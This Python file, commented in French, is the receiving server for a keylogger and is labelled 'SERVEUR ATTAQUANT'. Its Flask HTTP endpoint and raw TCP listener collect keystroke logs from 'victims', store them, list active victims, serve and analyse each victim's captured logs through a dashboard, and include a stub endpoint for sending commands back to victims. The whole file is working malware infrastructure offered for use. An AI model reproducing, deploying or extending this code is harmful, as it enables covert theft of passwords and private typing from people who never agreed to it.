"""
Serveur attaquant - Réception et stockage des logs
"""

from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import socket
import threading
import json
from datetime import datetime

import config
from storage import LogStorage

app = Flask(__name__, template_folder='templates', static_folder='static')
CORS(app)  # Permet les requêtes cross-origin

storage = LogStorage()
active_victims = {}  # {victim_id: last_seen_timestamp}


@app.route('/logs', methods=['POST'])
def receive_logs():
    """
    Endpoint HTTP pour recevoir les logs
    """
    try:
        data = request.json
        
        if not data or 'victim_id' not in data or 'logs' not in data:
            return jsonify({"error": "Données invalides"}), 400
        
        victim_id = data['victim_id']
        logs = data['logs']
        
        # Mettre à jour la liste des victimes actives
        active_victims[victim_id] = datetime.now().isoformat()
        
        # Sauvegarder les logs
        if storage.save_logs(victim_id, logs):
            print(f"[+] {len(logs)} logs reçus de {victim_id}")
            return jsonify({"status": "success", "received": len(logs)}), 200
        else:
            return jsonify({"error": "Erreur de sauvegarde"}), 500
    
    except Exception as e:
        print(f"[-] Erreur lors de la réception: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/victims', methods=['GET'])
def list_victims():
    """
    Liste toutes les victimes actives
    """
    victims = storage.get_victims()
    active = []
    
    for victim_id in victims:
        last_seen = active_victims.get(victim_id, "Jamais")
        active.append({
            "victim_id": victim_id,
            "last_seen": last_seen,
            "active": victim_id in active_victims
        })
    
    return jsonify({"victims": active}), 200


@app.route('/victims/<victim_id>/logs', methods=['GET'])
def get_victim_logs(victim_id):
    """
    Récupère les logs d'une victime
    """
    date = request.args.get('date', None)
    logs = storage.get_victim_logs(victim_id, date)
    
    return jsonify({
        "victim_id": victim_id,
        "count": len(logs),
        "logs": logs
    }), 200


@app.route('/victims/<victim_id>/analyze', methods=['GET'])
def analyze_victim(victim_id):
    """
    Analyse les logs d'une victime
    """
    logs = storage.get_victim_logs(victim_id)
    analysis = storage.analyze_logs(logs)
    
    return jsonify({
        "victim_id": victim_id,
        "analysis": analysis
    }), 200


@app.route('/command', methods=['POST'])
def receive_command():
    """
    Reçoit une commande pour une victime (pour communication bidirectionnelle future)
    """
    data = request.json
    # Cette fonctionnalité peut être étendue pour envoyer des commandes aux victimes
    return jsonify({"status": "received"}), 200


@app.route('/')
def dashboard():
    """
    Page principale du dashboard web
    """
    return render_template('dashboard.html')


def tcp_server():
    """
    Serveur TCP pour recevoir les logs
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', config.TCP_PORT))
        sock.listen(5)
        print(f"[+] Serveur TCP en écoute sur le port {config.TCP_PORT}")
        
        while True:
            client_sock, address = sock.accept()
            print(f"[+] Connexion TCP depuis {address}")
            
            # Traiter la connexion dans un thread séparé
            thread = threading.Thread(
                target=handle_tcp_client,
                args=(client_sock, address)
            )
            thread.daemon = True
            thread.start()
    
    except Exception as e:
        print(f"[-] Erreur serveur TCP: {e}")
    finally:
        sock.close()


def handle_tcp_client(client_sock, address):
    """
    Gère un client TCP connecté
    """
    try:
        data = b""
        while True:
            chunk = client_sock.recv(4096)
            if not chunk:
                break
            data += chunk
        
        # Décoder et parser les données
        data_str = data.decode('utf-8')
        data_json = json.loads(data_str)
        
        victim_id = data_json.get('victim_id')
        logs = data_json.get('logs', [])
        
        if victim_id and logs:
            active_victims[victim_id] = datetime.now().isoformat()
            storage.save_logs(victim_id, logs)
            print(f"[+] {len(logs)} logs reçus via TCP de {victim_id}")
        
        client_sock.sendall(b"OK")
    
    except Exception as e:
        print(f"[-] Erreur lors du traitement TCP: {e}")
    finally:
        client_sock.close()


def start_tcp_server():
    """
    Démarre le serveur TCP dans un thread séparé
    """
    tcp_thread = threading.Thread(target=tcp_server, daemon=True)
    tcp_thread.start()


if __name__ == "__main__":
    print("=" * 50)
    print("SERVEUR ATTAQUANT - Keylogger Receiver")
    print("=" * 50)
    print(f"[+] Port HTTP: {config.HTTP_PORT}")
    print(f"[+] Port TCP: {config.TCP_PORT}")
    print(f"[+] Dossier de stockage: {config.STORAGE_DIR}")
    print("=" * 50)
    
    # Démarrer le serveur TCP
    start_tcp_server()
    
    # Démarrer le serveur HTTP
    print(f"[+] Démarrage du serveur HTTP...")
    app.run(host='0.0.0.0', port=config.HTTP_PORT, debug=False)

